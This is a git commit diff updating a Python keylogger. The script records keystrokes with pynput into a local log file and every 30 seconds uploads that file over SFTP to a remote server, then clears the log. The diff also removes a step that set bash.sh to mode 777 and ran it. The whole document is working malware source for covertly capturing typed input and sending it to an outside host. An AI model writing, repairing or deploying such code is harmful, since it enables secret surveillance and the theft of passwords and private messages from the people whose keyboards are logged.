6596756d0bfb1719c2f4059ae35205244d42d1e1
Songül Kızılay <songulkizilay46@gmail.com>
2025-06-08 23:01:02 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,55 +1,56 @@
-from paramiko import SSHClient, AutoAddPolicy, RSAKey
+from paramiko import SSHClient, AutoAddPolicy
 from paramiko.auth_handler import AuthenticationException, SSHException
+from pynput.keyboard import Key, Listener
 import os
 import time
-from pynput.keyboard import Key,Listener
 
-count=0
-keys=[]
+count = 0
+keys = []
 
 def on_press(key):
-    global keys,count
-
+    global keys, count
     keys.append(key)
     count += 1
-    print("".format(key))
-
     if count >= 10:
-        count=0
+        count = 0
         write_file(keys)
-        keys=[]
-
+        keys = []
 
 def write_file(keys):
-    with open("log.txt","a") as f:
+    with open("log.txt", "a") as f:
         for key in keys:
-            k=str(key).replace("'" ,"")
-          #  if k.find(b"space")>0:
-           #     f.write('\n')
-            #elif k.find("Key")== -1:
-            f.write(k)
+            k = str(key).replace("'", "")
+            if k == "Key.space":
+                f.write(" ")
+            elif k == "Key.enter":
+                f.write("\n")
+            elif k.startswith("Key."):
+                continue
+            else:
+                f.write(k)
 
 def on_release(key):
-    if key==Key.esc:
+    if key == Key.esc:
         return False
-		
-def gonder_abisi(dosya,kayityeri):
-	ssh = paramiko.SSHClient()
-	ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
-	ssh.connect("sunucuadi", username="kullaniciadi", password="sifre")
-	sftp = ssh.open_sftp()
-	sftp.put(dosya, kayityeri)
-	sftp.close()
-	ssh.close()
 
-with Listener(on_press=on_press, on_release=on_release) as listenner:
-    listenner.join()
+def gonder_abisi(dosya, kayityeri):
+    ssh = SSHClient()
+    ssh.set_missing_host_key_policy(AutoAddPolicy())
+    try:
+        ssh.connect("sunucu", username="kullanici", password="sifre")
+        sftp = ssh.open_sftp()
+        sftp.put(dosya, kayityeri)
+        sftp.close()
+        ssh.close()
+    except (AuthenticationException, SSHException) as e:
+        print(f"Bağlantı hatası: {e}")
 
-os.system("chmod 777 bash.sh")
-os.system("./bash.sh") #gerekli dosyalarÄ± yÃ¼kledfgf
-
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
 starttime = time.time()
 while True:
-	gonder_abisi("log.txt","/root/kayitlar/log"+tr(time.time())+".txt")
-	time.sleep(30.0 - ((time.time() - starttime) % 30.0))
+    if os.path.exists("log.txt") and os.path.getsize("log.txt") > 0:
+        gonder_abisi("log.txt", f"/root/kayitlar/log{str(int(time.time()))}.txt")
+        open("log.txt", "w").close()
+    time.sleep(30.0 - ((time.time() - starttime) % 30.0))
